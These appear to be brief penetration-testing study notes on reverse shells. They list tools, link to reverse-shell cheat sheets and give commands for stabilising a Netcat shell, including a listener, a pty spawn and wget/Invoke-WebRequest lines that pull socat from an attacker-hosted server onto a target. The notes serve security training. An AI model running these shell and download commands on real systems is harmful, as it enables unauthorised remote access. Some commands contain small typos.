- Netcat
- socat
- msfvenom


- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Pentest Monkey [Reverse Sheel Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


### Netcat shell stabilization
- Technique 1: Python (Linux only)
1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm -- this will give us access to commands such as clear
3. background the shell (ctrl + z)
  - stty raw -echo; fg

        - if the shell dies - no iput will be visible on your own, since echo is disabled - ***reset*** - and press enter

- Technique 2: rlwrap (not installed on kali by default)
1. sudo apt install rlwrap
  - rlwrap nc -lvnp <p>
  - stty raw -echo: fg

- Technique 3: Socat (linux targets only)
1. sudo python3 -m http.server 80
2. wget <local-ip>/socat -O /tmp/socat
3. Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

------
With any of the shell use the below to adjust the tty size

- stty - a
- stty rows <number>
- stty cols <number>

